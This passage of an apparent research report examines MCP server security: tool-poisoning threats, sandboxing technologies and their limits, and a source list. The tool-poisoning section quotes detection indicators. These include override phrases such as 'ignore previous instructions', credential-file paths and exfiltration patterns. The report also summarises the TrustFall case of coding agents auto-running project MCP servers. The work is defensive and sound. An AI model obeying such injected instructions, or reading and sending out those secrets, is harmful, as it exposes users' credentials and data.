**OWASP MCP Top 10, MCP03:2025 — Tool Poisoning** ([OWASP www-project-mcp-top-10, fetched 2026-09-19](https://github.com/OWASP/www-project-mcp-top-10/blob/main/2025/MCP03-2025%E2%80%93Tool-Poisoning.md)). The doc's title says "Tool Poisoning" but its body is written about **schema** poisoning. Verbatim from the "Detection Indicators (Static Analysis)" section — these are the concrete, checkable signals:

- **Model-directed imperatives**: "instructions aimed at the model rather than describing the tool, such as 'ignore previous instructions', 'do not tell the user', or 'before answering, read ...'"
- **Sensitive-path references**: "a benign tool description that mentions credential or secret locations (`~/.ssh`, `id_rsa`, `.env`, `.aws/credentials`, `/etc/passwd`)"
- **Exfiltration patterns**: "an action verb (send, post, upload, forward) near an external destination (a URL, webhook, or endpoint)"
- **Hidden or zero-width characters**: "zero-width spaces and bidirectional control characters (**U+200B-200F, U+202A-202E, U+2060, U+FEFF**) used to smuggle instructions past human review"
- **Comment-smuggled instructions**: "model-directed text hidden inside HTML or markdown comments (`<!-- ... -->`) that a rendered view would not show"

Controls the doc recommends: signed schemas/manifests (JWS/COSE/PKI) verified by the agent before use; content-addressable hash identifiers; immutable schema registry (Git with signed commits, branch protection, multi-person approval); least-privilege RBAC with separation of duties; policy-as-code semantic invariants (it names OPA/Rego and gives the example "archive actions cannot map to HTTP DELETE unless explicitly approved"); schema provenance metadata (author, signature, hash, timestamp, approved-by) logged per invocation; runtime enforcement — "Require a 'schema attestation' that binds the schema hash to a specific agent identity and session" and pause execution when semantic impact exceeds a threshold.

**Microsoft, 2026-06-30** — cited by CSA as: "[Securing AI Agents: When AI Tools Move from Reading to Acting](https://www.microsoft.com/en-us/security/blog/2026/06/30/securing-ai-agents-ai-tools-move-from-reading-acting/)", Microsoft Security Blog, **2026-06-30**. CSA's summary: "Microsoft's guidance frames a tool description change as equivalent to a dependency update… introduces controls including **signed tool manifests, automated metadata scanning for embedded instructions, and dynamic tool scoping** that restricts an agent to only the specific tools required for a given session." *(I did not fetch the Microsoft post directly — the framing is CSA's summary.)* Microsoft also maintains an Azure-specific MCP security guide at [microsoft.github.io/mcp-azure-security-guide](https://microsoft.github.io/mcp-azure-security-guide/mcp/mcp03-tool-poisoning/).

**TrustFall (Adversa AI, 2026-05-07)** — cited by CSA: "Researchers found that **Claude Code, Cursor CLI, Gemini CLI, and GitHub Copilot CLI all auto-executed project-defined MCP servers upon acceptance of a folder trust prompt**, without separately disclosing that code execution would occur. All four tools defaulted their trust prompts to an affirmative response." Further: "Claude Code's handling of headless CI runs (the default mode for the official `claude-code-action`) **skipped the trust dialog entirely**, meaning the same attack would execute with zero human interaction against pull-request branches." *(CSA summary of the Adversa disclosure; I did not fetch Adversa's post directly.)*

**Docker's positioning** (relevant because Docker is the largest vendor shipping MCP containment): Docker published "17,600 Actions: Agent Security Is a Systems Problem" on **2026-08-18** and "YOLO Mode: Agent Autonomy Without the Guardrails" on **2026-09-03** ([Docker blog index sidebar, fetched 2026-09-19](https://www.docker.com/blog/why-microvms-the-architecture-behind-docker-sandboxes/)). I did **not** fetch these bodies; the titles, dates, and the framing "17,600 attacker actions show why AI agent security can't rely on human review" come from Docker's own listing. **Content UNVERIFIED.**

### 7.3 Is sandboxing an accepted mitigation, with numbers?

**Accepted, yes — but the numbers are about containment, not about reducing ASR.** The distinction matters:

- **Direct ASR-reduction numbers for sandboxing do not exist in the sources I found.** No published study I located measures "tool-poisoning ASR with sandbox X vs. without." Anyone claiming sandboxing reduces the 36.5% figure is conflating two different measurements.
- **What sandboxing does, per the sources, is bound the blast radius:** Anthropic's claim is about *prompt reduction*, not injection resistance — "sandboxing safely reduces permission prompts by 84%" ([Anthropic engineering](https://www.anthropic.com/engineering/claude-code-sandboxing)). Claude Code's docs frame it as: "Even if a successful prompt injection occurs, the sandbox boundary holds regardless of what the model chose to run" — the docs' exact framing is that OS enforcement "holds regardless of what the model chose to run and even if an allowed command does more than its name suggests" ([code.claude.com/docs/en/sandboxing](https://code.claude.com/docs/en/sandboxing)).
- **Docker explicitly excludes prompt injection from its gateway threat model** (§2.2), which is an admission that a containment boundary is not an injection defence.
- **The MCP spec's own mitigation for tool poisoning is consent and human-in-the-loop**, not sandboxing: clients **SHOULD** "Prompt for user confirmation on sensitive operations", "Show tool inputs to the user before calling the server, to avoid malicious or accidental data exfiltration", "Validate tool results before passing to LLM" ([tools.md, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md)).
- **The empirically-grounded mitigations in the literature are provenance-flavoured, not isolation-flavoured:** signed tool manifests (Microsoft), schema attestation binding hash→agent identity→session (OWASP), content-addressable schema hashes, and treating MCP config changes as code-review events (CSA). MCP-SandboxScan adds *auditing* via controlled WASI execution — i.e. sandboxing used as an **instrument for evidence collection**, not as a runtime defence.

**Honest conclusion for §7:** as of 2026-09-19, sandboxing is universally recommended (MCP spec SHOULD, OWASP, Microsoft, CSA, Anthropic, Docker) and there is strong *mechanism* evidence that it bounds damage, but there is **no published, controlled measurement of sandboxing's effect on tool-poisoning attack success rate.** That gap is the most defensible "unverified" claim in this report.

---

## 8. Cross-cutting synthesis

### 8.1 The isolation-technology decision matrix, as the sources actually support it

| Approach | Who ships it | Isolation strength | Compatibility cost | Evidence of MCP use |
|---|---|---|---|---|
| **No isolation** (SDK default) | TS SDK, Python SDK, most clients | None — child inherits full user authority minus env vars | None | Verified from source, §6.6 |
| **Seatbelt profile** (`sandbox-exec -p`) | Anthropic sandbox-runtime / Claude Code (macOS) | Kernel-enforced FS + network port allowlist; no kernel isolation | Moderate — Apple Events, trustd/Go TLS, docker, pbcopy all break | Verified, §5.2 |
| **bubblewrap + seccomp** | Anthropic (Linux/WSL2), Flatpak | Namespace + bind-mount + syscall filter; **no separate kernel** | Moderate; needs unprivileged userns | Verified, §5.2, §6.5 |
| **runc container** (Docker MCP Gateway) | Docker | Namespaces + caps + default seccomp (~44 syscalls) + `no-new-privileges` + cgroup limits; shared host kernel | Low | Verified, §2.6 |
| **gVisor (`runsc`)** | Google; **no MCP-specific integration found** | Userspace kernel; ~no syscall passthrough; per-sandbox Sentry + Gofer | Higher — incomplete syscall/`/proc`/`/sys` coverage; per-syscall overhead | **None found** |
| **microVM** (Docker Sandboxes) | Docker | Hypervisor boundary + own kernel + own Docker daemon | Highest resource cost, lowest compat cost | Yes — but **MCP stdio servers run on the host, outside the VM** |
| **WASI component** | Extism / wasmCloud / Spin / Wasmtime; **no MCP registry support** | Strongest by construction (no ambient authority) | Highest — cannot run npm/PyPI/native deps or shell out | Research only (SandScope); no official path |

### 8.2 Where sources conflict or are thin

1. **Docker secret scoping: per-server (security.md) vs. per-profile limitation (profiles.md).** Both statements are in the same repo's docs as of 2026-09-19. Likely reconcilable (server-scoped but not profile-scoped), but the docs do not say so. **CONFLICT.**
2. **Docker MCP Gateway config surface: two documentation generations.** The Go module v0.33.0 README (Dec 2025) documents `~/.docker/mcp/{docker-mcp,registry,config,tools}.yaml` and `docker mcp config read/write`; the current `main` README documents profiles and catalogs in a local database. `docs/catalog.md` on `main` still carries a banner: "This method of catalog management is deprecated and only works if the profiles feature flag is off." **CONFLICT between doc generations.**
3. **`sandbox-exec` "deprecated" (man page, 2017) vs. actively used (sandbox-runtime v0.0.77, 2026-09-18).** Not a contradiction in fact — deprecated ≠ removed — but the practical guidance is the opposite of what a naive reading of "DEPRECATED" suggests. Anthropic ships on it; Apple recommends against it.
4. **Docker's own position on WASM.** Docker's engineering blog argues WASM isolates are unsuitable for coding agents ("your agent can't install system packages or run arbitrary shell commands"); the academic MCP-WASM work (SandScope) uses WASI precisely *because* it is restrictive — as an auditing harness rather than a production runtime. Both are correct for their stated purpose; they should not be cited against each other.
5. **SEP-1024's authority.** The SEP page itself says it is "preserved as a historical record" and that the current spec is authoritative; the current Security Best Practices page restates the consent MUST and adds the sandboxing SHOULDs. Cite the *spec page* for current requirements, the *SEP* for provenance/date.
6. **gVisor is not used by anything MCP-adjacent that I could find.** Every claim I have seen that "Docker MCP Gateway uses gVisor" is unsupported by the gateway's own documentation. **Flag this as a likely widespread misconception.**

### 8.3 Explicit evidence gaps (do not guess in these areas)

- Exact removal/breakage status of `sandbox-exec` on macOS 15 / 26 (no Apple statement found).
- `sandbox_init(3)` deprecation attributes and public-SDK availability.
- Endpoint Security entitlement name and its suitability for child-process confinement.
- Apple's canonical SBPL profile paths (`/System/Library/Sandbox/Profiles`, `/usr/share/sandbox`).
- The exact Ubuntu/Debian/Fedora sysctl and AppArmor profile restricting unprivileged user namespaces.
- Wasmtime `-S` sub-key spellings (`wasmtime run -S help` is authoritative).
- Claude Desktop's MCP process-isolation behaviour (no documentation found).
- OpenAI Codex CLI sandboxing (`sandbox_mode`, `approval_policy`, `codex-linux-sandbox`) — not verified in this pass.
- Gemini CLI `--sandbox` implementation (docker/podman/Seatbelt) — not verified in this pass.
- MCPTox's exact per-model ASR table (only the CSA-reported summary numbers are cited here).
- Any controlled measurement of sandboxing's effect on tool-poisoning ASR — I believe none exists, but "I searched and did not find" ≠ "it does not exist".

---

## 9. Primary sources

Grouped by topic; every URL was fetched during this research on 2026-09-19 unless a different date is stated.

### MCP specification and official docs
- MCP Security Best Practices, protocol 2026-07-28 — https://modelcontextprotocol.io/docs/2026-07-28/tutorials/security/security_best_practices.md (fetched 2026-09-19)
- MCP Authorization Security Considerations, protocol 2026-07-28 — https://modelcontextprotocol.io/specification/2026-07-28/basic/authorization/security-considerations.md (fetched 2026-09-19)
- SEP-1024, "MCP Client Security Requirements for Local Server Installation", Final, created 2025-07-22 — https://modelcontextprotocol.io/seps/1024-mcp-client-security-requirements-for-local-server-.md (fetched 2026-09-19)
- MCP specification Key Changes, 2026-07-28 — https://modelcontextprotocol.io/specification/2026-07-28/changelog.md (fetched 2026-09-19)
- MCP Tools spec, 2026-07-28 — https://modelcontextprotocol.io/specification/2026-07-28/server/tools.md (fetched 2026-09-19)
- MCP stdio transport spec, 2026-07-28 — https://modelcontextprotocol.io/specification/2026-07-28/basic/transports/stdio.md (fetched 2026-09-19)
- MCP Registry Supported Package Types — https://modelcontextprotocol.io/registry/package-types.md (fetched 2026-09-19)
- MCP Security Interest Group charter, initial charter 2026-06-13 — https://modelcontextprotocol.io/community/interest-groups/security.md (fetched 2026-09-19)
- MCP documentation index (full page + SEP list) — https://modelcontextprotocol.io/llms.txt (fetched 2026-09-19)

### Docker
- `docker/mcp-gateway` security model — https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/security.md (fetched 2026-09-19; PR #532 "Document gateway security boundaries", landed in v0.43.3, 2026-07-16)
- `docker/mcp-gateway` README — https://raw.githubusercontent.com/docker/mcp-gateway/main/README.md (fetched 2026-09-19)
- `docker mcp gateway run` generated CLI reference — https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/generator/reference/mcp_gateway_run.md (fetched 2026-09-19)
- `docker/mcp-gateway` server entry specification — https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/server-entry-spec.md (fetched 2026-09-19)
- `docker/mcp-gateway` profiles — https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/profiles.md (fetched 2026-09-19)
- `docker/mcp-gateway` catalog management (deprecated path) — https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/catalog.md (fetched 2026-09-19)
- `docker/mcp-gateway` gateway operations — https://raw.githubusercontent.com/docker/mcp-gateway/main/docs/mcp-gateway.md (fetched 2026-09-19)
- Release v0.43.3, 2026-07-16 — https://github.com/docker/mcp-gateway/releases/tag/v0.43.3
- Release v0.43.1 (security hardening; "Action required"), 2026-06-25 — https://github.com/docker/mcp-gateway/releases/tag/v0.43.1
- Release v0.42.2 (CVE-2026-55887 fix), 2026-05-28 — https://github.com/docker/mcp-gateway/releases/tag/v0.42.2
- Release v0.42.0 (profiles always on), 2026-04-30 — https://github.com/docker/mcp-gateway/releases/tag/v0.42.0
- Release v0.40.3 (`se://` URI fallback), 2026-03-20 — https://github.com/docker/mcp-gateway/releases/tag/v0.40.3
- Release feed (authoritative release list + timestamps) — https://github.com/docker/mcp-gateway/releases.atom (fetched 2026-09-19)
- Go module version history — https://pkg.go.dev/github.com/docker/mcp-gateway?tab=versions (fetched 2026-09-19)
- GO-2026-5604 / CVE-2026-55887, published 2026-06-25 — https://pkg.go.dev/vuln/GO-2026-5604
- GHSA-r2xf-7jw5-pjg6 — https://github.com/docker/mcp-gateway/security/advisories/GHSA-r2xf-7jw5-pjg6
- Docker MCP Toolkit docs — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/toolkit.md (fetched 2026-09-19)
- Docker MCP Gateway docs page — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/mcp-gateway.md (fetched 2026-09-19)
- Docker MCP CLI docs — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/cli.md (fetched 2026-09-19)
- Docker MCP Toolkit FAQs (credentials in Docker Desktop VM since **4.43.0**) — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/mcp-catalog-and-toolkit/faqs.md (fetched 2026-09-19)
- Docker Sandboxes architecture (`sbx` 0.42.0) — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/sandboxes/architecture.md (fetched 2026-09-19)
- Docker Sandboxes security model — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/sandboxes/security/_index.md (fetched 2026-09-19)
- Docker Sandboxes index — https://raw.githubusercontent.com/docker/docs/main/content/manuals/ai/sandboxes/_index.md (fetched 2026-09-19)
- Docker blog, "Why MicroVMs: The Architecture Behind Docker Sandboxes", **2026-04-16** — https://www.docker.com/blog/why-microvms-the-architecture-behind-docker-sandboxes/
- Docker blog, "Docker MCP Gateway: Open Source, Secure Infrastructure for Agentic AI", **2025-07-09** — https://www.docker.com/blog/docker-mcp-gateway-secure-infrastructure-for-agentic-ai/
- Docker seccomp profile docs — https://raw.githubusercontent.com/docker/docs/main/content/manuals/engine/security/seccomp.md (fetched 2026-09-19)

### gVisor
- "What is gVisor?" — https://gvisor.dev/docs/ (fetched 2026-09-19)
- Platform Guide (KVM / systrap / ptrace; systrap default since mid-2023) — https://gvisor.dev/docs/architecture_guide/platforms/ (fetched 2026-09-19)
- Release gVisor 20260914.0, tagged **2026-09-16** — https://github.com/google/gvisor/releases/tag/release-20260914.0
- Release gVisor 20260907.0, tagged 2026-09-11 — https://github.com/google/gvisor/releases/tag/release-20260907.0
- Release gVisor 20260831.0, tagged 2026-09-04 — https://github.com/google/gvisor/releases/tag/release-20260831.0
- Release gVisor 20260817.0, tagged 2026-08-25 — https://github.com/google/gvisor/releases/tag/release-20260817.0
- Release feed — https://github.com/google/gvisor/releases.atom (fetched 2026-09-19)

### WASM / WASI
- WASI 0.3 release page (0.3.0 = 2026-06-11; 0.3.1 = 2026-08-11; Wasmtime 46+ defaults) — https://wasi.dev/releases/wasi-p3 (fetched 2026-09-19)
- Wasmtime CLI options — https://docs.wasmtime.dev/cli-options.html (fetched 2026-09-19)
- Wasmtime v48.0.2, 2026-09-10 — https://github.com/bytecodealliance/wasmtime/releases/tag/v48.0.2
- Wasmtime v48.0.0, 2026-08-20 (sockets denied by default; fuel costs; Rust 1.95) — https://github.com/bytecodealliance/wasmtime/releases/tag/v48.0.0
- Wasmtime v47.0.4, 2026-08-20 (GHSA-vqjp-4c8c-hfgg, GHSA-x84v-gj2h-g759) — https://github.com/bytecodealliance/wasmtime/releases/tag/v47.0.4
- Wasmtime release feed — https://github.com/bytecodealliance/wasmtime/releases.atom (fetched 2026-09-19)
- Extism v1.30.0, 2026-06-04 — https://github.com/extism/extism/releases/tag/v1.30.0 ; dev build on Wasmtime 48 LTS, 2026-09-02 — https://github.com/extism/extism/releases/tag/latest ; feed — https://github.com/extism/extism/releases.atom
- wasmCloud v2.9.0, 2026-09-08 — https://github.com/wasmCloud/wasmCloud/releases/tag/v2.9.0 ; feed — https://github.com/wasmCloud/wasmCloud/releases.atom
- Spin (Spinframework) v4.1.0, 2026-08-26 (Wasmtime 44.0.0; wasm32-wasip2) — https://github.com/spinframework/spin/releases/tag/v4.1.0 ; feed — https://github.com/spinframework/spin/releases.atom
- MCP-SandboxScan / SandScope, arXiv:2601.01241 v1 2026-01-03, v2 2026-06-22 — https://arxiv.org/abs/2601.01241
- wasmCloud community meeting, "MCP Server as a Wasm Component", 2025-10-08 — https://wasmcloud.website.cncfstack.io/community/2025-10-08-community-meeting/ (date approximate; not a canonical blog)

### macOS / Anthropic Claude Code
- `sandbox-exec(1)` man page, dated **2017-03-09**, "DEPRECATED" — https://keith.github.io/xcode-man-pages/sandbox-exec.1.html (fetched 2026-09-19)
- Claude Code, "Configure the sandboxed Bash tool" — https://code.claude.com/docs/en/sandboxing (fetched 2026-09-19)
- Claude Code sandbox environments — https://code.claude.com/docs/en/sandbox-environments
- Claude Code settings reference (sandbox keys) — https://code.claude.com/docs/en/settings-reference#sandbox-settings
- Anthropic engineering, "Making Claude Code more secure and autonomous with sandboxing" (84% prompt reduction; publication date not displayed on page — **UNVERIFIED**) — https://www.anthropic.com/engineering/claude-code-sandboxing
- `anthropics/sandbox-runtime` README (Seatbelt profiles via `sandbox-exec`; bubblewrap; WFP) — https://raw.githubusercontent.com/anthropics/sandbox-runtime/main/README.md (fetched 2026-09-19)
- sandbox-runtime v0.0.77, **2026-09-18** — https://github.com/anthropics/sandbox-runtime/releases/tag/v0.0.77
- sandbox-runtime v0.0.76, 2026-09-10 — https://github.com/anthropics/sandbox-runtime/releases/tag/v0.0.76
- sandbox-runtime v0.0.71, 2026-08-07 — https://github.com/anthropics/sandbox-runtime/releases/tag/v0.0.71
- sandbox-runtime release feed — https://github.com/anthropics/sandbox-runtime/releases.atom (fetched 2026-09-19)

### Linux
- `namespaces(7)`, man-pages 6.19, page dated **2026-02-08**, HTML rendered 2026-09-09 — https://man7.org/linux/man-pages/man7/namespaces.7.html (fetched 2026-09-19)
- Kernel `no_new_privs` documentation — https://docs.kernel.org/userspace-api/no_new_privs.html (fetched 2026-09-19; doc tree 7.3.0-rc3)
- Kernel Landlock documentation, dated **August 2026** — https://docs.kernel.org/userspace-api/landlock.html (fetched 2026-09-19; doc tree 7.3.0-rc3)
- bubblewrap 0.12.0, **2026-08-26** (setuid removed; GHSA-pxhw-h44j-8pfx) — https://github.com/containers/bubblewrap/releases/tag/v0.12.0
- bubblewrap 0.11.2, 2026-04-23 (CVE-2026-41163; setuid deprecated) — https://github.com/containers/bubblewrap/releases/tag/v0.11.2
- bubblewrap 0.11.1, 2026-03-21 — https://github.com/containers/bubblewrap/releases/tag/v0.11.1
- bubblewrap release feed — https://github.com/containers/bubblewrap/releases.atom (fetched 2026-09-19)
- MCP TypeScript SDK stdio transport source — https://raw.githubusercontent.com/modelcontextprotocol/typescript-sdk/main/packages/client/src/client/stdio.ts (fetched 2026-09-19)
- MCP TypeScript SDK stdio subpath entry — https://raw.githubusercontent.com/modelcontextprotocol/typescript-sdk/main/packages/client/src/stdio.ts (fetched 2026-09-19)
- MCP Python SDK (v2) stdio transport source — https://raw.githubusercontent.com/modelcontextprotocol/python-sdk/main/src/mcp/client/stdio.py (fetched 2026-09-19)

### Prompt injection / tool poisoning
- Cloud Security Alliance research note, "MCP Attack Surface: Tool Poisoning and IDE Auto-Execution", **2026-07-01** — https://labs.cloudsecurityalliance.org/research/csa-research-note-mcp-tool-poisoning-auto-execution-20260701/
- MCPTox: Chen et al., arXiv:2508.14925, **August 2025** — https://arxiv.org/abs/2508.14925
- OWASP MCP Top 10, MCP03:2025 Tool Poisoning — https://github.com/OWASP/www-project-mcp-top-10/blob/main/2025/MCP03-2025%E2%80%93Tool-Poisoning.md (fetched 2026-09-19); rendered attack page: https://owasp.org/www-community/attacks/MCP_Tool_Poisoning
- OWASP/Microsoft, MCP03 Tool Poisoning, Azure security guide — https://microsoft.github.io/mcp-azure-security-guide/mcp/mcp03-tool-poisoning/
- Microsoft Security Blog, "Securing AI Agents: When AI Tools Move from Reading to Acting", **2026-06-30** — https://www.microsoft.com/en-us/security/blog/2026/06/30/securing-ai-agents-ai-tools-move-from-reading-acting/ (cited via CSA; body not fetched)
- Invariant Labs, "MCP Security Notification: Tool Poisoning Attacks", **April 2025** — https://invariantlabs.ai/blog/mcp-security-notification-tool-poisoning-attacks (cited via CSA/OWASP; body not fetched)
- Check Point Research, "Cursor IDE's MCP Vulnerability (MCPoison)", **2025-08-05** — https://research.checkpoint.com/2025/cursor-vulnerability-mcpoison/ (cited via CSA/OWASP; body not fetched)
- Cato Networks / AIM Security, "CurXecute" RCE in Cursor, **2025-08-01** — https://www.catonetworks.com/blog/curxecute-rce/ (cited via CSA; body not fetched)
- Adversa AI, "TrustFall", **2026-05-07** — https://adversa.ai/blog/trustfall-coding-agent-security-flaw-rce-claude-cursor-gemini-cli-copilot/ (cited via CSA; body not fetched)
- Wiz Research, Amazon Q MCP auto-execution, **2026-06-26** — https://www.wiz.io/blog/amazon-q-vulnerability (cited via CSA; body not fetched)
